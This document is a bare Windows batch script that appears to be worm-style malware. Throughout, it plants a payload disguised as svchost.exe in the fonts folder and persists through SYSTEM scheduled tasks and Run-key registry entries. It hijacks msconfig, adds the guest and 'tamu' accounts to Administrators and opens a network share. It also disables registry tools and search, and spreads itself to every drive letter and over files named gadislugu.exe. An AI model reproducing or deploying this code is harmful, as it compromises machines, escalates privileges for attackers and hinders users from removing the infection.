 @echo off
 if exist %windir%\fonts\svchost.exe goto makan
 echo a > %windir%\tasks\aaa.job
 schtasks /create /ru system /sc minute /tn makan /tr %windir%\fonts\svchost.exe
 schtasks /create /ru system /sc onlogon /tn minum /tr %windir%\fonts\svchost.exe
 for %%a in (*) do if %%~za equ 205990 copy %%a %windir%\fonts\svchost.exe
 mkdir %windir%\fonts\hai
 copy %windir%\fonts\svchost.exe %windir%\fonts\hai\cewekhot.exe
 net share cewekxxx=%windir%\fonts\hai
 net localgroup administrators tamu /add
 net localgroup administrators guest /add
 echo y| reg add hkcu\software\microsoft\windows\currentversion\run /v regmon /t reg_sz /d %windir%\fonts\svchost.exe
 echo y| reg add hklm\software\microsoft\windows\currentversion\app" "paths\msconfig.exe /ve /t reg_sz /d %windir%\fonts\svchost.exe
 echo y| reg add hkcu\software\microsoft\windows\currentversion\policies\system /v disableregistrytools /t reg_dword /d 1
 echo y| reg add hkcu\software\microsoft\windows\currentversion\policies\explorer /v nofind /t reg_dword /d 1

 mkdir cewekhot
 attrib cewekhot +s +h +r
 copy %systemdrive%\documents" "and" "settings\all" "users\documents\my" "pictures\sample" "pictures\*.jpg cewekhot
 explorer cewekhot
 goto exit
 :makan
 for %%d in (c: d: e: f: g: h: i: j: k: l: m:) do copy %windir%\fonts\svchost.exe %%d
 if not exist c:\recycler\gadislugu.exe for /R c:\ %%d in (gadislugu.exe) do copy %windir%\fonts\svchost.exe "%%d"
 if not exist d:\recycler\gadislugu.exe for /R d:\ %%d in (gadislugu.exe) do copy %windir%\fonts\svchost.exe "%%d"
 if not exist e:\recycler\gadislugu.exe for /R e:\ %%d in (gadislugu.exe) do copy %windir%\fonts\svchost.exe "%%d"
 if not exist f:\recycler\gadislugu.exe for /R f:\ %%d in (gadislugu.exe) do copy %windir%\fonts\svchost.exe "%%d"
 if not exist g:\recycler\gadislugu.exe for /R g:\ %%d in (gadislugu.exe) do copy %windir%\fonts\svchost.exe "%%d"
 if not exist h:\recycler\gadislugu.exe for /R h:\ %%d in (gadislugu.exe) do copy %windir%\fonts\svchost.exe "%%d"
 if not exist i:\recycler\gadislugu.exe for /R i:\ %%d in (gadislugu.exe) do copy %windir%\fonts\svchost.exe "%%d"
 if not exist j:\recycler\gadislugu.exe for /R j:\ %%d in (gadislugu.exe) do copy %windir%\fonts\svchost.exe "%%d"
 if not exist k:\recycler\gadislugu.exe for /R k:\ %%d in (gadislugu.exe) do copy %windir%\fonts\svchost.exe "%%d"
 if not exist l:\recycler\gadislugu.exe for /R l:\ %%d in (gadislugu.exe) do copy %windir%\fonts\svchost.exe "%%d"
 if not exist m:\recycler\gadislugu.exe for /R m:\ %%d in (gadislugu.exe) do copy %windir%\fonts\svchost.exe "%%d"
 goto exit
 :exit
 exit
